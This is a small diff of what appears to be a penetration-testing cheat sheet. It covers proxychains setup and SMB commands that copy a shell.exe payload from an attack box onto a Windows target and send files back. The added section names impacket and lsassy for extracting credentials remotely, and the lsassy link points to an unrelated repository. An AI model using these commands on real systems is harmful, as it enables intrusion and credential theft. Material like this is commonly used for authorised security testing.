@@ -264,6 +264,11 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
      net use \\IP\share /USER:USER PASS    
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
+## Remote Scripts  
+[impacket]()
+[lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
+
+
 
  ## AV Evasion  
  ### Check for AV  
